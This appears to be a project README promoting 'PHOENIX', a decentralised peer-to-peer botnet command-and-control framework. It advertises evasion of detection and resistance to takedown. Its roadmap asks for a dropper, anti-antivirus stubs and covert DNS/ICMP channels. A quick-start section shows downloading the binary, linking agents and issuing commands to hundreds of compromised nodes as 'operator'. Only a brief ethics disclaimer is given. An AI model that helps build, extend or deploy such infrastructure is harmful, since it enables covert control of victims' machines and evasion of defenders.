
# PHOENIX – The Undetectable Self-Healing P2P C2

**No server. No domain. No single point of failure. You can't kill what has no head.**

![alt text](data/image.png)

## Why PHOENIX is a Game Changer

| Feature                        | Traditional C2 | PHOENIX                              |
|--------------------------------|----------------|--------------------------------------|
| Central server?                | Yes            | Never                                |
| Killable by blocking 1 IP?     | Yes            | Impossible                           |
| Operator has fixed location?   | Yes            | No – any node with the secret key    |
| Network dies when nodes drop?  | Yes            | No – self-healing graph              |
| Detectable by traffic pattern? | Easy           | Extremely hard (only 5 neighbors)    |
| Command authenticity           | Server cert    | Ed25519-signed by secret key         |

### Core Features (already working or 99% done)

- Fully decentralized P2P graph (go-libp2p + Kademlia DHT)
- Max 5 neighbors per agent → tiny traffic footprint
- Automatic self-healing (dead peers replaced in < 5s)
- Operator = whoever has the secret key (plug a USB, become king)
- Commands signed with Ed25519 → no spoofing
- End-to-end encrypted (Noise_XX)
- GossipSub broadcast (fast & reliable)
- Single binary, zero dependencies – works on Windows, Linux, macOS, ARM
- NAT traversal & hole punching built-in

### Current Challenges (we know, we’re fixing)

| Challenge                        | Status         | Plan                                 |
|----------------------------------|----------------|--------------------------------------|
| Command latency in 1000+ nodes   | ~3-8 sec       | Switch to Epidemic routing + priority queue |
| Cold boot (first 10 peers)       | Manual seed    | Add public bootstrap nodes + mDNS    |
| Operator key revocation          | Not yet        | Add time-limited JWT-style tokens    |
| Full disk encryption for key     | Optional       | Add hardware-bound key option        |

### Roadmap / To-Do (help wanted!)

- [ ] Epidemic routing for < 2s command delivery in huge graphs
- [ ] Built-in stager (dropper → phoenix.exe)
- [ ] Web panel that works as "temporary operator" (plug key → control)
- [ ] DNS + ICMP + WebSocket covert channels (layer on top)
- [ ] Anti-AV stub in Go (already tiny, but can be tinier)
- [ ] Dockerized simulation environment (10k bots in minutes)
- [ ] YARA rules & detection research paper (blue team side)

## Quick Start (5 seconds)

```bash
# Download latest release (Windows/Linux/macOS/ARM)
wget https://github.com/yourname/phoenix/releases/latest/download/phoenix.exe

# First agent (becomes bootstrap node)
./phoenix.exe --listen /ip4/0.0.0.0/tcp/9000

# Other agents (auto-discover)
./phoenix.exe --bootstrap /ip4/YOUR_IP/tcp/9000

# Become Operator (any agent, any time)
./phoenix.exe --operator-key secret.key
> whoami
Operator mode activated. Network is yours.
> list
867 agents online
> run calc.exe
Done. 867/867
```

## License & Ethics

Academic / Red Team / Defensive research only.  
Do not use against systems you don’t own or have explicit permission to test.

If you’re a student doing this as final year project… this is the one that makes the committee go “holy sh*t”.

Star if you want resilient C2 that refuses to die.  
Pull requests welcome. Let’s make it unbreakable.

**PHOENIX – Rise from any ash.**  
Built with love, Go, and zero trust.